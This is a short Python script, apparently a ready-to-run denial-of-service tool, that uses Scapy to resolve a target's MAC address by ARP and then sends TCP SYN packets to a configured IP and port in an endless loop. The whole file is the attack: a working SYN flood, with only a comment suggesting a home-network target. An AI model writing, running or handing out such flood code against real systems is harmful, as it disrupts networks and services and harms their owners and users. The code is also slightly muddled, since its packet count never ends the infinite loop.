from scapy.all import *
from scapy.layers.l2 import ARP, Ether

# Configuration
TARGET_IP = '192.168.188.1'  # Change this to the target IP in your home network
TARGET_PORT = 80  # Change this to the target port
PACKET_COUNT = 1200  # Number of SYN packets to send

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def send_syn_flood(target_ip, target_port, count):
    mac = get_mac(target_ip)
    if mac is None:
        print(f"Could not resolve MAC address for {target_ip}")
        return

    while True:
        for i in range(count):
            ip = IP(dst=target_ip)
            tcp = TCP(dport=target_port, flags='S')
            packet = ip / tcp
            sendp(Ether(dst=mac) / packet, verbose=0)
            print("Sent packets")

# Generate SYN flood
send_syn_flood(TARGET_IP, TARGET_PORT, PACKET_COUNT)
